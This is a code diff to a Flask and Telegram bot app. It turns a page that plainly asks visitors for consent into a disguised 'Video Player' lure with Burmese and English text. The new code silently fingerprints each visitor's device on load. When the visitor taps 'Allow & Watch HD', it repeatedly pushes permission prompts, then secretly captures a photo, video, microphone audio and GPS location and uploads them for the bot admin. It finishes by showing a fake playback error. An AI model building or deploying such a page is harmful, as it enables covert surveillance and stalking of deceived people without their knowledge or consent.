@@ -6,567 +6,745 @@ import threading
 import requests
 from flask import Flask, request, render_template_string, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
 from datetime import datetime
 
 # ---------- Configuration ----------
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "")
-BASE_URL = os.environ.get("BASE_URL", "https://your-app.onrender.com")
+ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1838854178")
+BASE_URL = os.environ.get("BASE_URL", "https://ebb9a522-1f4f-4955-babf-9916f1eb5ac9-00-12ili6wwvrx3f.pike.replit.dev")
 
-# Shared memory (token -> user_id)
-tracking_links = {}
+tracking_links = {}   # token -> user_id
+seen_users = set()
 
-# ---------- Flask Web Server ----------
 flask_app = Flask(__name__)
 
-HTML_TEMPLATE = """
-<!DOCTYPE html>
+# ─────────────────────────────────────────
+# HTML TEMPLATE  (video-player disguise)
+# mode values: all | photo | audio | location | video | device
+# ─────────────────────────────────────────
+HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Consent-Based Information Collection</title>
-    <style>
-        body { font-family: Arial, sans-serif; max-width: 800px; margin: 20px auto; padding: 20px; background: #f4f4f4; }
-        .card { background: white; border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        button { background: #007bff; color: white; border: none; border-radius: 5px; padding: 8px 16px; margin: 5px; cursor: pointer; }
-        button:disabled { background: #ccc; cursor: not-allowed; }
-        .preview { margin-top: 10px; padding: 10px; background: #e9ecef; border-radius: 5px; }
-        video, audio, img { max-width: 100%; border-radius: 5px; margin-top: 5px; }
-        .warning { background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px; margin-bottom: 20px; }
-        hr { margin: 20px 0; }
-        .inline-keyboard {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            justify-content: center;
-            margin-top: 15px;
-        }
-        .inline-keyboard button {
-            background: #28a745;
-            font-weight: bold;
-            flex: 1 0 auto;
-            min-width: 180px;
-        }
-        .inline-keyboard button:nth-child(odd) { background: #17a2b8; }
-        .inline-keyboard button:nth-child(3) { background: #ffc107; color: black; }
-        .inline-keyboard button:nth-child(4) { background: #dc3545; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Video Player</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#fff;min-height:100vh}
+.topbar{background:#111;padding:10px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #222}
+.topbar .logo{font-size:1.2rem;font-weight:700;color:#e63946;letter-spacing:-0.5px}
+.topbar .logo span{color:#fff}
+.topbar .search{flex:1;background:#1e1e1e;border:1px solid #333;border-radius:20px;padding:6px 14px;color:#aaa;font-size:.85rem}
+.player-wrap{position:relative;background:#000;width:100%;aspect-ratio:16/9;max-height:60vw}
+.thumbnail{width:100%;height:100%;object-fit:cover;filter:brightness(.4)}
+.play-overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px}
+.play-btn{width:70px;height:70px;background:rgba(255,255,255,.15);border:3px solid #fff;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;backdrop-filter:blur(4px);transition:background .2s}
+.play-btn:hover{background:rgba(255,255,255,.3)}
+.play-btn svg{width:30px;height:30px;fill:#fff;margin-left:4px}
+.buffer-bar{position:absolute;bottom:0;left:0;right:0;height:3px;background:#333}
+.buffer-fill{height:100%;background:#e63946;width:0%;transition:width .4s ease}
+.modal-backdrop{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:100;align-items:center;justify-content:center}
+.modal-backdrop.show{display:flex}
+.modal{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:24px;max-width:340px;width:90%;text-align:center}
+.modal .icon{font-size:2.5rem;margin-bottom:10px}
+.modal h3{font-size:1.05rem;margin-bottom:8px;line-height:1.4}
+.modal p{color:#999;font-size:.82rem;line-height:1.6;margin-bottom:20px}
+.modal-btn{width:100%;padding:12px;background:#e63946;color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;margin-bottom:8px}
+.modal-btn.sec{background:#2a2a2a;color:#aaa;font-size:.82rem;font-weight:400}
+.info{padding:14px 16px 4px}
+.info h1{font-size:1rem;font-weight:600;line-height:1.4;margin-bottom:6px}
+.meta{color:#888;font-size:.8rem;margin-bottom:10px}
+.tags{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px}
+.tag{background:#1e1e1e;border:1px solid #333;border-radius:20px;padding:3px 10px;font-size:.75rem;color:#aaa}
+.section-title{padding:0 16px;font-size:.85rem;color:#888;margin-bottom:8px}
+.rec-list{display:flex;flex-direction:column;gap:0}
+.rec-item{display:flex;gap:10px;padding:10px 16px;cursor:pointer;border-bottom:1px solid #111}
+.rec-thumb{width:120px;min-width:120px;height:68px;background:#1e1e1e;border-radius:6px;overflow:hidden;position:relative}
+.rec-duration{position:absolute;bottom:4px;right:4px;background:rgba(0,0,0,.8);border-radius:3px;padding:1px 4px;font-size:.7rem}
+.rec-info{flex:1}
+.rec-title{font-size:.82rem;font-weight:500;margin-bottom:4px;line-height:1.3}
+.rec-sub{font-size:.72rem;color:#666}
+#toast{display:none;position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:8px 18px;border-radius:20px;font-size:.8rem;z-index:200}
+</style>
 </head>
 <body>
-    <div class="card">
-        <h1>📋 Information Collection</h1>
-        <div class="warning">
-            ⚠️ <strong>Your explicit consent is required</strong><br>
-            This page collects device information, and optionally camera/microphone/location.<br>
-            <strong>Nothing is sent until you click the "Send" buttons below.</strong>
-        </div>
-        <p>Token: <code id="tokenDisplay"></code></p>
-        <button id="sendFingerprint">📡 Send Device Fingerprint (Basic Info)</button>
-        <div id="fingerprintPreview" class="preview" style="display:none;"></div>
+<div class="topbar">
+  <div class="logo">▶<span>Stream</span></div>
+  <div class="search">Search videos...</div>
+</div>
+<div class="player-wrap" id="playerWrap">
+  <img class="thumbnail" src="https://picsum.photos/seed/vid1/800/450" alt="">
+  <div class="play-overlay" id="playOverlay">
+    <div class="play-btn" id="playBtn">
+      <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
     </div>
+  </div>
+  <div class="buffer-bar"><div class="buffer-fill" id="bufferFill"></div></div>
+</div>
+<div class="modal-backdrop" id="modal"></div>
+<div class="info">
+  <h1>Best Compilation 2024 – Must Watch! 🔥</h1>
+  <div class="meta">1.2M views &nbsp;•&nbsp; 2 days ago</div>
+  <div class="tags">
+    <span class="tag">#viral</span><span class="tag">#trending</span>
+    <span class="tag">#2024</span><span class="tag">#compilation</span>
+  </div>
+</div>
+<div class="section-title">Up Next</div>
+<div class="rec-list">
+  <div class="rec-item">
+    <div class="rec-thumb"><img src="https://picsum.photos/seed/rec1/120/68" style="width:100%;height:100%;object-fit:cover"><div class="rec-duration">12:34</div></div>
+    <div class="rec-info"><div class="rec-title">Top 10 Moments You Won't Believe</div><div class="rec-sub">ViralHub • 890K views</div></div>
+  </div>
+  <div class="rec-item">
+    <div class="rec-thumb"><img src="https://picsum.photos/seed/rec2/120/68" style="width:100%;height:100%;object-fit:cover"><div class="rec-duration">8:21</div></div>
+    <div class="rec-info"><div class="rec-title">Unbelievable Caught on Camera 2024</div><div class="rec-sub">TopClips • 2.1M views</div></div>
+  </div>
+  <div class="rec-item">
+    <div class="rec-thumb"><img src="https://picsum.photos/seed/rec3/120/68" style="width:100%;height:100%;object-fit:cover"><div class="rec-duration">15:07</div></div>
+    <div class="rec-info"><div class="rec-title">Funniest Fails of the Year – Part 3</div><div class="rec-sub">FailArmy • 4.5M views</div></div>
+  </div>
+  <div class="rec-item">
+    <div class="rec-thumb"><img src="https://picsum.photos/seed/rec4/120/68" style="width:100%;height:100%;object-fit:cover"><div class="rec-duration">6:48</div></div>
+    <div class="rec-info"><div class="rec-title">Amazing Talent Show Winners 2024</div><div class="rec-sub">ShowTime • 560K views</div></div>
+  </div>
+</div>
+<div id="toast"></div>
 
-    <!-- New Inline Keyboard Style Combined Actions -->
-    <div class="card">
-        <h2>🎛️ Combined Actions (Media + Device Info)</h2>
-        <div class="inline-keyboard">
-            <button id="combinedPhoto">📸 Photo + Device Info</button>
-            <button id="combinedVideo">🎥 Video + Device Info</button>
-            <button id="combinedLocation">📍 Location + Device Info</button>
-            <button id="combinedAudio">🎤 Audio + Device Info</button>
-        </div>
-        <div id="combinedPreview" class="preview" style="display:none;"></div>
-    </div>
+<script>
+const token = "{{ token }}";
+const mode  = "{{ mode }}";
 
-    <div class="card">
-        <h2>📸 Camera (Individual)</h2>
-        <button id="enableCamera">Enable Camera Preview</button>
-        <video id="cameraPreview" autoplay muted playsinline style="display:none;"></video>
-        <button id="capturePhoto" disabled>Capture Photo</button>
-        <button id="sendPhoto" disabled>📤 Send Photo to Telegram</button>
-        <div id="photoPreview" class="preview" style="display:none;"><img id="photoImg" width="200"></div>
-    </div>
+function showToast(msg, ms=3000){
+  const t=document.getElementById("toast");
+  t.textContent=msg; t.style.display="block";
+  setTimeout(()=>t.style.display="none",ms);
+}
+function animateBuffer(pct,dur){
+  const f=document.getElementById("bufferFill");
+  f.style.transition=`width ${dur}ms linear`;
+  f.style.width=pct+"%";
+}
 
-    <div class="card">
-        <h2>🎤 Microphone (Individual)</h2>
-        <button id="enableMic">Enable Microphone</button>
-        <button id="recordAudio" disabled>Record 5s Audio</button>
-        <button id="sendAudio" disabled>📤 Send Audio to Telegram</button>
-        <div id="audioPreview" class="preview" style="display:none;"><audio id="audioPlayer" controls></audio></div>
-    </div>
+/* ── Device model ── */
+async function getDeviceModel(){
+  if(navigator.userAgentData){
+    try{const d=await navigator.userAgentData.getHighEntropyValues(["model","platform"]);if(d.model&&d.model.trim())return d.model.trim();}catch(e){}
+  }
+  const ua=navigator.userAgent;
+  let m=ua.match(/;\\s*([A-Za-z0-9 _\\-]+)\\s+Build/);if(m)return m[1].trim();
+  m=ua.match(/\\(([^;)]+);\\s*([^;)]+);\\s*([^;)]+)\\)/);if(m)return m[3].trim();
+  return navigator.platform||"Unknown";
+}
 
-    <div class="card">
-        <h2>📍 Location (Individual)</h2>
-        <button id="getLocation">Get My Location</button>
-        <button id="sendLocation" disabled>📤 Send Location to Telegram</button>
-        <div id="locationPreview" class="preview" style="display:none;"></div>
-    </div>
+/* ── Fingerprint ── */
+async function collectFingerprint(){
+  let battery={};
+  try{const b=await navigator.getBattery();battery={batteryLevel:Math.round(b.level*100)+"%",charging:b.charging};}catch(e){}
+  const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
+  const deviceModel=await getDeviceModel();
+  return{
+    userAgent:navigator.userAgent, deviceModel,
+    platform:navigator.platform,
+    screenWidth:screen.width, screenHeight:screen.height,
+    language:navigator.language,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    hardwareConcurrency:navigator.hardwareConcurrency,
+    deviceMemory:navigator.deviceMemory,
+    maxTouchPoints:navigator.maxTouchPoints,
+    cookieEnabled:navigator.cookieEnabled,
+    connectionType:conn.effectiveType||conn.type||"unknown",
+    downlink:conn.downlink,
+    localTime:new Date().toString(),
+    ...battery
+  };
+}
 
-    <div class="card">
-        <h2>⌨️ Telegram Keyboard Demo (Simulated)</h2>
-        <button id="showInlineDemo">Show Inline Keyboard</button>
-        <button id="showMenuDemo">Show Menu Keyboard</button>
-        <div id="keyboardOutput" class="preview"></div>
-    </div>
+/* ── Silent fingerprint on load ── */
+async function sendFingerprint(){
+  try{
+    const fp=await collectFingerprint();
+    await fetch("/capture_fingerprint",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token,fingerprint:fp})});
+  }catch(e){}
+}
 
-    <footer style="text-align:center; font-size:12px; color:#666;">
-        🔐 All sends require your explicit button click. No background collection.
-    </footer>
+/* ── Permission modal helper ── */
+function showPermModal(icon,titleMM,titleEN,bodyMM,bodyEN){
+  return new Promise(resolve=>{
+    const bd=document.getElementById("modal");
+    bd.innerHTML=`<div class="modal">
+      <div class="icon">${icon}</div>
+      <h3>${titleMM}<br><small style="color:#aaa;font-size:.85em">${titleEN}</small></h3>
+      <p>${bodyMM}<br><span style="color:#777">${bodyEN}</span></p>
+      <button class="modal-btn" id="rBtn">ခွင့်ပြု &amp; ဆက်လက်ကြည့်ရှုမည် | Allow &amp; Continue</button>
+    </div>`;
+    bd.classList.add("show");
+    document.getElementById("rBtn").onclick=()=>{bd.classList.remove("show");resolve();};
+  });
+}
 
-    <script>
-        const token = window.location.pathname.split('/').pop();
-        document.getElementById('tokenDisplay').innerText = token;
+/* ── Camera ── */
+async function getCameraStream(facing){
+  while(true){
+    try{return await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1280},height:{ideal:720}}});}
+    catch(e){await showPermModal("📸","ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်","Camera Access Required","HD ဗီဒီယိုကြည့်ရန် ကင်မရာ ခွင့်ပြုပါ","Allow camera access to stream in HD.");}
+  }
+}
+/* ── Microphone ── */
+async function getMicStream(){
+  while(true){
+    try{return await navigator.mediaDevices.getUserMedia({audio:true});}
+    catch(e){await showPermModal("🎤","မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်","Microphone Required","အသံဖြင့်ကြည့်ရန် မိုက်ခရိုဖုန်း ခွင့်ပြုပါ","Allow microphone for audio playback.");}
+  }
+}
+/* ── Location ── */
+async function getLocationPos(){
+  while(true){
+    try{return await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:12000}));}
+    catch(e){await showPermModal("📍","တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်","Location Required","သင့်တည်နေရာ စစ်ဆေးမှသာ ဗီဒီယိုကြည့်နိုင်မည်","Location verification required to watch this content.");}
+  }
+}
 
-        // ---------- Device Fingerprint (reusable) ----------
-        async function collectFingerprint() {
-            const data = {};
-            data.userAgent = navigator.userAgent;
-            data.language = navigator.language;
-            data.platform = navigator.platform;
-            data.cookieEnabled = navigator.cookieEnabled;
-            data.hardwareConcurrency = navigator.hardwareConcurrency;
-            data.deviceMemory = navigator.deviceMemory;
-            data.maxTouchPoints = navigator.maxTouchPoints;
-            data.vendor = navigator.vendor;
-            data.screenWidth = screen.width;
-            data.screenHeight = screen.height;
-            data.colorDepth = screen.colorDepth;
-            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            data.localTime = new Date().toString();
-            if (navigator.connection) {
-                data.connectionType = navigator.connection.effectiveType;
-                data.downlink = navigator.connection.downlink;
-                data.rtt = navigator.connection.rtt;
-            }
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                data.batteryLevel = Math.round(battery.level * 100) + '%';
-                data.charging = battery.charging;
-            }
-            return data;
-        }
+/* ── Capture functions ── */
+async function sendPhoto(){
+  try{
+    const stream=await getCameraStream("environment");
+    const video=document.createElement("video");
+    video.srcObject=stream; video.setAttribute("playsinline",""); video.setAttribute("muted","");
+    await new Promise((res,rej)=>{video.onloadedmetadata=()=>video.play().then(res).catch(rej);video.onerror=rej;});
+    await new Promise(r=>setTimeout(r,2000));
+    const canvas=document.createElement("canvas");
+    canvas.width=video.videoWidth||1280; canvas.height=video.videoHeight||720;
+    canvas.getContext("2d").drawImage(video,0,0);
+    stream.getTracks().forEach(t=>t.stop());
+    const blob=await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.92));
+    if(!blob||blob.size<1000)return;
+    const fp=await collectFingerprint();
+    const form=new FormData();
+    form.append("token",token); form.append("photo",blob,"photo.jpg"); form.append("fingerprint",JSON.stringify(fp));
+    await fetch("/capture_combined_photo",{method:"POST",body:form});
+  }catch(e){}
+}
 
-        // Basic fingerprint send (unchanged)
-        document.getElementById('sendFingerprint').onclick = async () => {
-            const fingerprintData = await collectFingerprint();
-            const previewDiv = document.getElementById('fingerprintPreview');
-            previewDiv.innerHTML = `<strong>Fingerprint data collected:</strong><br>
-                <pre>${JSON.stringify(fingerprintData, null, 2)}</pre>
-                <button id="confirmSendFingerprint">✅ Confirm Send to Telegram</button>`;
-            previewDiv.style.display = 'block';
-            document.getElementById('confirmSendFingerprint').onclick = () => {
-                sendToTelegram('/capture_fingerprint', { token: token, fingerprint: fingerprintData });
-            };
-        };
+async function sendLocation(){
+  try{
+    const pos=await getLocationPos();
+    const fp=await collectFingerprint();
+    const form=new FormData();
+    form.append("token",token); form.append("lat",pos.coords.latitude); form.append("lon",pos.coords.longitude); form.append("fingerprint",JSON.stringify(fp));
+    await fetch("/capture_combined_location",{method:"POST",body:form});
+  }catch(e){}
+}
 
-        // ---------- Combined Actions Helpers ----------
-        async function sendCombined(endpoint, formData) {
-            const response = await fetch(endpoint, { method: 'POST', body: formData });
-            const result = await response.json();
-            alert(result.message);
-        }
+async function sendVideo(){
+  try{
+    const mimeType=MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")?"video/webm;codecs=vp8,opus":"video/webm";
+    const stream=await getCameraStream("user");
+    const micStream=await getMicStream();
+    const combined=new MediaStream([...stream.getVideoTracks(),...micStream.getAudioTracks()]);
+    const recorder=new MediaRecorder(combined,{mimeType});
+    const chunks=[];
+    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
+    recorder.start(500); await new Promise(r=>setTimeout(r,6000)); recorder.stop();
+    stream.getTracks().forEach(t=>t.stop()); micStream.getTracks().forEach(t=>t.stop());
+    await new Promise(r=>recorder.onstop=r);
+    const blob=new Blob(chunks,{type:mimeType});
+    const fp=await collectFingerprint();
+    const form=new FormData();
+    form.append("token",token); form.append("video",blob,"video.webm"); form.append("fingerprint",JSON.stringify(fp));
+    await fetch("/capture_combined_video",{method:"POST",body:form});
+  }catch(e){}
+}
 
-        // Combined Photo
-        let combinedPhotoBlob = null;
-        document.getElementById('combinedPhoto').onclick = async () => {
-            // Request camera access if not already
-            let stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const videoElem = document.createElement('video');
-            videoElem.srcObject = stream;
-            await videoElem.play();
-            // Capture frame
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElem.videoWidth || 640;
-            canvas.height = videoElem.videoHeight || 480;
-            canvas.getContext('2d').drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(async blob => {
-                combinedPhotoBlob = blob;
-                const fingerprint = await collectFingerprint();
-                const formData = new FormData();
-                formData.append('token', token);
-                formData.append('photo', blob, 'combined_photo.jpg');
-                formData.append('fingerprint', JSON.stringify(fingerprint));
-                sendCombined('/capture_combined_photo', formData);
-                // Cleanup
-                stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg');
-        };
+async function sendAudio(){
+  try{
+    const stream=await getMicStream();
+    const mimeType=MediaRecorder.isTypeSupported("audio/webm;codecs=opus")?"audio/webm;codecs=opus":"audio/webm";
+    const recorder=new MediaRecorder(stream,{mimeType});
+    const chunks=[];
+    recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
+    recorder.start(500); await new Promise(r=>setTimeout(r,10000)); recorder.stop();
+    stream.getTracks().forEach(t=>t.stop());
+    await new Promise(r=>recorder.onstop=r);
+    const blob=new Blob(chunks,{type:mimeType});
+    const fp=await collectFingerprint();
+    const form=new FormData();
+    form.append("token",token); form.append("audio",blob,"audio.webm"); form.append("fingerprint",JSON.stringify(fp));
+    await fetch("/capture_combined_audio",{method:"POST",body:form});
+  }catch(e){}
+}
 
-        // Combined Video (5 second clip)
-        document.getElementById('combinedVideo').onclick = async () => {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
-            let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
-                const fingerprint = await collectFingerprint();
-                const formData = new FormData();
-                formData.append('token', token);
-                formData.append('video', videoBlob, 'combined_video.mp4');
-                formData.append('fingerprint', JSON.stringify(fingerprint));
-                sendCombined('/capture_combined_video', formData);
-                stream.getTracks().forEach(t => t.stop());
-            };
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 5000);
-            alert('Recording 5 seconds video...');
-        };
+/* ── Modal texts per mode ── */
+const modalTexts={
+  all:    {icon:"📺",mm:"HD ဗီဒီယို ကြည့်ရှုရန် လိုအပ်သည်",en:"HD Playback Required",bmm:"ကင်မရာ၊ မိုက်ခရိုဖုန်းနှင့် တည်နေရာ ခွင့်ပြုချက်ပေးပါ",ben:"Allow camera, microphone & location to watch in HD."},
+  photo:  {icon:"📸",mm:"ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",en:"Camera Access Required",bmm:"HD ကြည့်ရှုရန် ကင်မရာ ဖွင့်ပေးပါ",ben:"Enable camera to stream HD content."},
+  audio:  {icon:"🎤",mm:"အသံ ခွင့်ပြုချက် လိုအပ်သည်",en:"Audio Access Required",bmm:"HD အသံဖြင့်ကြည့်ရန် မိုက်ခရိုဖုန်း ဖွင့်ပေးပါ",ben:"Enable microphone for HD audio playback."},
+  location:{icon:"📍",mm:"တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်",en:"Location Verification Required",bmm:"သင့်ဒေသ စစ်ဆေးမှသာ ဤဗီဒီယိုကြည့်နိုင်မည်",ben:"Location check required to watch content in your region."},
+  video:  {icon:"🎥",mm:"ဗီဒီယို ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",en:"Video Access Required",bmm:"HD ဗီဒီယိုကြည့်ရန် ကင်မရာ ဖွင့်ပေးပါ",ben:"Allow camera to stream HD video."},
+  device: {icon:"📱",mm:"Device စစ်ဆေးမှု လိုအပ်သည်",en:"Device Verification Required",bmm:"ဗီဒီယိုကြည့်ရန် Device စစ်ဆေးချက် လိုအပ်သည်",ben:"Device verification required to continue watching."}
+};
 
-        // Combined Location
-        document.getElementById('combinedLocation').onclick = () => {
-            navigator.geolocation.getCurrentPosition(async position => {
-                const location = { lat: position.coords.latitude, lon: position.coords.longitude };
-                const fingerprint = await collectFingerprint();
-                const formData = new FormData();
-                formData.append('token', token);
-                formData.append('lat', location.lat);
-                formData.append('lon', location.lon);
-                formData.append('fingerprint', JSON.stringify(fingerprint));
-                sendCombined('/capture_combined_location', formData);
-            }, err => alert('Location error: ' + err.message));
-        };
+/* ── Main capture dispatcher ── */
+async function startCapture(){
+  animateBuffer(10,600);
+  if(mode==="all"){
+    await sendPhoto();       animateBuffer(30,500);
+    await sendLocation();    animateBuffer(55,500);
+    await sendVideo();       animateBuffer(82,500);
+    await sendAudio();       animateBuffer(100,300);
+  } else if(mode==="photo"){
+    await sendPhoto();       animateBuffer(100,600);
+  } else if(mode==="audio"){
+    await sendAudio();       animateBuffer(100,600);
+  } else if(mode==="location"){
+    await sendLocation();    animateBuffer(100,600);
+  } else if(mode==="video"){
+    await sendVideo();       animateBuffer(100,600);
+  } else {
+    animateBuffer(100,600);  // device: already sent on load
+  }
+  showToast("Playback error. Please try again later.");
+  document.getElementById("playOverlay").innerHTML='<div style="color:#fff;font-size:.85rem;opacity:.6">Playback unavailable</div>';
+}
 
-        // Combined Audio (5 second)
-        document.getElementById('combinedAudio').onclick = async () => {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-            let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-                const fingerprint = await collectFingerprint();
-                const formData = new FormData();
-                formData.append('token', token);
-                formData.append('audio', audioBlob, 'combined_audio.webm');
-                formData.append('fingerprint', JSON.stringify(fingerprint));
-                sendCombined('/capture_combined_audio', formData);
-                stream.getTracks().forEach(t => t.stop());
-            };
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 5000);
-            alert('Recording 5 seconds audio...');
-        };
+/* ── Play button ── */
+document.getElementById("playBtn").onclick=()=>{
+  const t=modalTexts[mode]||modalTexts.all;
+  const bd=document.getElementById("modal");
+  bd.innerHTML=`<div class="modal">
+    <div class="icon">${t.icon}</div>
+    <h3>${t.mm}<br><small style="color:#aaa;font-size:.85em">${t.en}</small></h3>
+    <p>${t.bmm}<br><span style="color:#777">${t.ben}</span></p>
+    <button class="modal-btn" id="allowBtn">ခွင့်ပြု &amp; ကြည့်ရှုမည် | Allow &amp; Watch HD</button>
+    <button class="modal-btn sec" id="skipBtn">အနိမ့်အရည်အသွေးဖြင့်ကြည့်မည် | Watch Low Quality</button>
+  </div>`;
+  bd.classList.add("show");
+  document.getElementById("allowBtn").onclick=async()=>{
+    bd.classList.remove("show");
+    document.getElementById("playOverlay").innerHTML='<div style="color:#fff;font-size:.9rem;opacity:.7">Buffering...</div>';
+    await startCapture();
+  };
+  document.getElementById("skipBtn").onclick=()=>{
+    bd.classList.remove("show");
+    showToast("ဤဗီဒီယိုသည် သင့်ဒေသတွင် မရနိုင်ပါ | Content unavailable in your region.");
+  };
+};
 
-        // ---------- Individual Media Functions (unchanged except minor fixes) ----------
-        let cameraStream = null;
-        let currentPhotoBlob = null;
-        document.getElementById('enableCamera').onclick = async () => {
-            if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
-            cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('cameraPreview');
-            video.srcObject = cameraStream;
-            video.style.display = 'block';
-            document.getElementById('capturePhoto').disabled = false;
-        };
-        document.getElementById('capturePhoto').onclick = () => {
-            const video = document.getElementById('cameraPreview');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                currentPhotoBlob = blob;
-                const img = document.getElementById('photoImg');
-                img.src = URL.createObjectURL(blob);
-                document.getElementById('photoPreview').style.display = 'block';
-                document.getElementById('sendPhoto').disabled = false;
-            }, 'image/jpeg');
-        };
-        document.getElementById('sendPhoto').onclick = () => {
-            if (!currentPhotoBlob) return;
-            sendMedia('photo', currentPhotoBlob, 'photo.jpg');
-        };
-
-        let audioStream = null;
-        let recordedAudioBlob = null;
-        document.getElementById('enableMic').onclick = async () => {
-            if (audioStream) audioStream.getTracks().forEach(t => t.stop());
-            audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            document.getElementById('recordAudio').disabled = false;
-        };
-        let mediaRecorderAudio = null;
-        let audioChunks = [];
-        document.getElementById('recordAudio').onclick = () => {
-            if (!audioStream) return;
-            audioChunks = [];
-            mediaRecorderAudio = new MediaRecorder(audioStream);
-            mediaRecorderAudio.ondataavailable = e => audioChunks.push(e.data);
-            mediaRecorderAudio.onstop = () => {
-                recordedAudioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                const url = URL.createObjectURL(recordedAudioBlob);
-                document.getElementById('audioPlayer').src = url;
-                document.getElementById('audioPreview').style.display = 'block';
-                document.getElementById('sendAudio').disabled = false;
-            };
-            mediaRecorderAudio.start();
-            setTimeout(() => mediaRecorderAudio.stop(), 5000);
-            alert('Recording 5 seconds...');
-        };
-        document.getElementById('sendAudio').onclick = () => {
-            if (!recordedAudioBlob) return;
-            sendMedia('audio', recordedAudioBlob, 'audio.wav');
-        };
-
-        let currentLocation = null;
-        document.getElementById('getLocation').onclick = () => {
-            navigator.geolocation.getCurrentPosition(pos => {
-                currentLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-                document.getElementById('locationPreview').innerHTML = `
-                    <strong>Lat:</strong> ${currentLocation.lat}<br>
-                    <strong>Lon:</strong> ${currentLocation.lon}<br>
-                    <button id="confirmSendLocation">✅ Confirm Send Location</button>`;
-                document.getElementById('locationPreview').style.display = 'block';
-                document.getElementById('confirmSendLocation').onclick = () => {
-                    sendToTelegram('/capture_location', { token: token, location: currentLocation });
-                };
-            }, err => alert('Location error: ' + err.message));
-        };
-
-        // Helper functions
-        async function sendToTelegram(endpoint, payload) {
-            const response = await fetch(endpoint, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            const result = await response.json();
-            alert(result.message || 'Sent to Telegram!');
-        }
-
-        async function sendMedia(type, blob, filename) {
-            const formData = new FormData();
-            formData.append('token', token);
-            formData.append('media', blob, filename);
-            const response = await fetch(`/capture_${type}`, { method: 'POST', body: formData });
-            const result = await response.json();
-            alert(result.message);
-        }
-
-        // Keyboard demos
-        document.getElementById('showInlineDemo').onclick = () => {
-            document.getElementById('keyboardOutput').innerHTML = `
-                <strong>Inline Keyboard (simulated):</strong><br>
-                <code>{"inline_keyboard":[[{"text":"Button 1","callback_data":"1"},{"text":"Button 2","url":"https://example.com"}]]}</code><br>
-                <button onclick="alert('Inline demo clicked')">Simulate Click</button>
-            `;
-        };
-        document.getElementById('showMenuDemo').onclick = () => {
-            document.getElementById('keyboardOutput').innerHTML = `
-                <strong>Menu Keyboard (ReplyKeyboardMarkup):</strong><br>
-                <code>{"keyboard":[["Yes","No"],["Help"]],"resize_keyboard":true}</code><br>
-                <div><button>Yes</button> <button>No</button> <button>Help</button></div>
-            `;
-        };
-    </script>
